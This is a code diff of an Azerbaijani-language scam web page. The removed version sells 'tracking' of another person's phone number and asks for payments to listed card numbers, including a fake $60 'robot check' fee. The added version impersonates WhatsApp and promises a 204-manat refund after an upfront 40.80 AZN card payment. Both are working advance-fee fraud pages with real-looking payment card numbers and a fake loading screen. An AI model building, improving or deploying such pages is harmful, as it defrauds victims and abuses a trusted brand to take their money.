@@ -1,301 +1,261 @@
-j
-<!DOCTYPE html>
+<!qDOCTYPE html>
 <html lang="az">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Aysu Piriyeva</title>
+<title>WhatsApp</title>
 
 <style>
-*{box-sizing:border-box}
-
-body{
-    margin:0;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
-    background:linear-gradient(135deg,#0d63d8,#1479ed);
-    color:#0b2858;
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
 }
 
-.container{
-    width:92%;
-    max-width:620px;
-    margin:70px auto 30px;
-    background:#dcecff;
-    border-radius:35px;
-    padding:35px 28px;
-    box-shadow:0 15px 40px rgba(0,0,0,.18);
+body {
+    font-family: Arial, Helvetica, sans-serif;
+    background: linear-gradient(180deg, #eef8ff, #ffffff);
+    color: #07194d;
+    min-height: 100vh;
 }
 
-.logo{
-    text-align:center;
-    background:#1976e8;
-    color:white;
-    padding:25px 10px;
-    border-radius:30px;
-    margin:-75px auto 35px;
-    width:75%;
-    font-size:25px;
-    font-weight:700;
+.container {
+    width: 100%;
+    max-width: 520px;
+    margin: auto;
+    padding-bottom: 35px;
 }
 
-h1{
-    text-align:center;
-    font-size:42px;
-    margin:20px 0 10px;
+.hero {
+    height: 300px;
+    background: linear-gradient(145deg, #007aff, #dff3ff);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 0 0 45px 45px;
+    position: relative;
+    overflow: hidden;
 }
 
-.subtitle{
-    text-align:center;
-    color:#58719a;
-    font-size:20px;
-    margin-bottom:35px;
+.hero::before,
+.hero::after {
+    content: "";
+    position: absolute;
+    border-radius: 50%;
+    background: rgba(255,255,255,.18);
 }
 
-label{
-    display:block;
-    font-size:20px;
-    font-weight:700;
-    margin:20px 0 8px;
+.hero::before {
+    width: 330px;
+    height: 330px;
 }
 
-input,select{
-    width:100%;
-    padding:22px;
-    border:2px solid #9bc8ff;
-    border-radius:25px;
-    background:#f7fbff;
-    font-size:18px;
-    color:#173b70;
+.hero::after {
+    width: 230px;
+    height: 230px;
 }
 
-button{
-    width:100%;
-    border:0;
-    border-radius:28px;
-    padding:20px;
-    margin-top:30px;
-    background:#0878f9;
-    color:white;
-    font-size:20px;
-    font-weight:700;
+.whatsapp {
+    width: 150px;
+    height: 150px;
+    border-radius: 50%;
+    background: #25D366;
+    border: 10px solid white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 78px;
+    font-weight: bold;
+    z-index: 2;
+    box-shadow: 0 15px 40px rgba(0,0,0,.18);
 }
 
-.screen{display:none}
-.screen.active{display:block}
-
-.card{
-    background:#0b2d62;
-    color:white;
-    border-radius:25px;
-    padding:28px;
-    margin-top:25px;
+.form {
+    padding: 25px 20px;
 }
 
-.card-title{
-    text-align:center;
-    opacity:.8;
-    margin-bottom:25px;
+label {
+    display: block;
+    font-size: 20px;
+    font-weight: 700;
+    margin: 15px 4px 9px;
 }
 
-.card-number{
-    text-align:center;
-    font-size:20px;
-    letter-spacing:4px;
-    margin:25px 0;
+.input {
+    width: 100%;
+    height: 62px;
+    border: 2px solid #087cff;
+    border-radius: 18px;
+    background: white;
+    padding: 0 20px;
+    font-size: 18px;
+    outline: none;
 }
 
-.card-bottom{
-    display:flex;
-    justify-content:space-between;
-    font-size:14px;
+.refund {
+    margin-top: 25px;
+    padding: 25px 18px;
+    border-radius: 28px;
+    background: linear-gradient(145deg,#eaf8ff,#ffffff);
+    box-shadow: 0 10px 35px rgba(0,100,220,.10);
 }
 
-.note{
-    text-align:center;
-    color:#58719a;
-    font-size:17px;
-    margin-top:22px;
-    line-height:1.5;
+.title {
+    text-align: center;
+    font-size: 27px;
+    font-weight: 800;
+    line-height: 1.2;
+    margin-bottom: 22px;
 }
 
-.demo{
-    text-align:center;
-    margin-top:15px;
-    color:#2870bd;
-    font-size:13px;
-    font-weight:600;
+.blue {
+    color: #087cff;
+}
+
+.calculation {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.box {
+    flex: 1;
+    min-height: 120px;
+    background: white;
+    border-radius: 20px;
+    padding: 18px 8px;
+    text-align: center;
+}
+
+.box strong {
+    display: block;
+    font-size: 27px;
+    margin-top: 10px;
+}
+
+.percent {
+    font-size: 24px;
+    font-weight: 800;
+    color: #087cff;
+    text-align: center;
+}
+
+.note {
+    margin-top: 22px;
+    padding: 15px;
+    border-radius: 16px;
+    background: #f5fbff;
+    font-size: 16px;
+    line-height: 1.45;
+    text-align: center;
+}
+
+.disabled {
+    background: #f3f3f3;
+    color: #999;
+    cursor: not-allowed;
+}
+
+.ok {
+    width: 100%;
+    height: 65px;
+    margin-top: 25px;
+    border: 0;
+    border-radius: 20px;
+    background: linear-gradient(90deg,#087cff,#0064d9);
+    color: white;
+    font-size: 28px;
+    font-weight: 800;
+    cursor: pointer;
+}
+
+.ok:active {
+    transform: scale(.98);
+}
+
+@media(max-width:380px) {
+    .title {
+        font-size: 23px;
+    }
+
+    .box strong {
+        font-size: 23px;
+    }
+
+    .whatsapp {
+        width: 130px;
+        height: 130px;
+        font-size: 65px;
+    }
 }
 </style>
 </head>
 
 <body>
 
-<!-- 1-Cİ EKRAN -->
-<div id="screen1" class="screen active">
 <div class="container">
 
-<div class="logo">🔒<br>aysu.piriyeva2</div>
+    <div class="hero">
+        <div class="whatsapp">☎</div>
+    </div>
 
-<h1>AYSU PİRİYEVA</h1>
-<div class="subtitle">Düzgün izləmə — Etibarlı həll</div>
+    <div class="form">
 
-<label>Sizin nömrəniz</label>
-<input type="text" placeholder="+994 XX XXX XX XX">
+        <label>WhatsApp nömrəsi</label>
+        <input
+            class="input"
+            type="tel"
+            placeholder="+994 XX XXX XX XX"
+        >
 
-<label>Qarşı tərəfin nömrəsi</label>
-<input type="text" placeholder="+994 XX XXX XX XX">
+        <div class="refund">
 
-<label>Müddət</label>
-<select>
-<option>6 ay</option>
-<option>12 ay</option>
-<option>1 ay</option>
-</select>
+            <div class="title">
+                Pulun geri qaytarılması üçün<br>
+                <span class="blue">204 manatın 20%-i</span> ödənilir.
+            </div>
 
-<button onclick="showScreen(2)">→ START</button>
+            <div class="calculation">
 
-</div>
-</div>
+                <div class="box">
+                    Yerin səthi
+                    <strong>204 AZN</strong>
+                </div>
 
+                <div class="percent">
+                    20%<br>
+                    →
+                </div>
 
-<!-- 2-Cİ EKRAN -->
-<div id="screen2" class="screen">
-<div class="container">
+                <div class="box">
+                    Ödəniləcək məbləğ
+                    <strong>40.80 AZN</strong>
+                </div>
 
-<h1>Təbriklər!</h1>
+            </div>
 
-<div class="subtitle">
-Müraciətiniz təsdiqləndi.
-</div>
+            <div class="note">
+                40.80 AZN ödənildikdən sonra
+                <b>204 manat ilə birlikdə ümumi pul geri qaytarılır.</b>
+            </div>
 
-<div class="note">
-Linkin aktivləşməsi üçün kart nömrəsinə ödəniş edib davam edin.
-</div>
-
-<div class="card">
-<div class="card-title">KART</div>
-
-<div class="card-number">
-5167 5142 5347 2979
-</div>
-
-<div class="card-bottom">
-<span>CARD</span>
-<span>MM/YY</span>
-</div>
-</div>
-
-<div class=>
-
-</div>
-
-<button onclick="showScreen(3)">→ DAVAM ET</button>
-
-</div>
-</div>
-
-
-<!-- 3-CÜ EKRAN -->
-<div id="screen3" class="screen">
-<div class="container">
-
-<h1>Xoş İzləmələr!</h1>
-
-<div class="subtitle">
-Hörmətli müştəri, sistem robot olmadığınızı təsdiqləmək üçün ödəniş tələb edir. Ödəniş anında geri qaytarılacaq.
-</div>
-
-<div class="note">
-Robot olmadığınızı təsdiqləmək üçün 60$ ödəniş tələb olunur. Məbləğ təsdiqdən sonra geri qaytarılır.
-</div>
-
-<div class="card">
-<div class="card-title">TƏSDİQLƏMƏ</div>
-<button type="button">Təsdiqlə</button>
-<div class="card-number">
-5522 0993 9289 9787 
-</div>
-
-<div class="card-bottom">
-<span>CARD</span>
-<span>MM/YY</span>
-</div>
-</div>
-
-
-</style>
-<script>
-function showScreen(number) {
-    document.querySelectorAll(".screen").forEach(function(screen) {
-        screen.classList.remove("active");
-    });
-
-    const nextScreen = document.getElementById("screen" + number);
-
-    if (nextScreen) {
-        nextScreen.classList.add("active");
-        window.scrollTo(0, 0);
-}
-}
-</script>
-</body><script>
-document.addEventListener("click", function (e) {
-
-  const ok = e.target.closest("button");
-
-  if (ok && ok.textContent.trim().toLowerCase() === "ok") {
-
-    document.body.innerHTML = `
-      <div style="
-        position:fixed;
-        inset:0;
-        background:#fff;
-        display:flex;
-        flex-direction:column;
-        align-items:center;
-        justify-content:center;
-        font-family:Arial,sans-serif;
-        text-align:center;
-      ">
-
-        <div style="
-          width:65px;
-          height:65px;
-          border:6px solid #e6edf5;
-          border-top:6px solid #1769ff;
-          border-radius:50%;
-          animation:fırlan 0.8s linear infinite;
-        "></div>
-
-        <div style="
-          margin-top:22px;
-          font-size:20px;
-          font-weight:600;
-          color:#1769ff;
-        ">
-          Məlumatlar yüklənir...
         </div>
 
-        <div style="
-          margin-top:8px;
-          font-size:14px;
-          color:#777;
-        ">
-          Zəhmət olmasa gözləyin
-        </div>
+        <label>Ödəniş üçün kart nömrəsi 4127 2222 7362 8826</label>
+        <input
+            class="input disabled"
+            type="text"
+            placeholder="Məlumat daxil edilmir"
+            disabled
+        >
 
-      </div>
+        <button class="ok" type="button">
+            Təsdiq edirəm →
+        </button>
 
-      <style>
-        @keyframes fırlan {
-          from { transform:rotate(0deg); }
-          to { transform:rotate(360deg); }
-        }
-      </style>
-    `;
+    </div>
+</div>
 
-  }
-
-});
-</script>
+</body>
 </html>
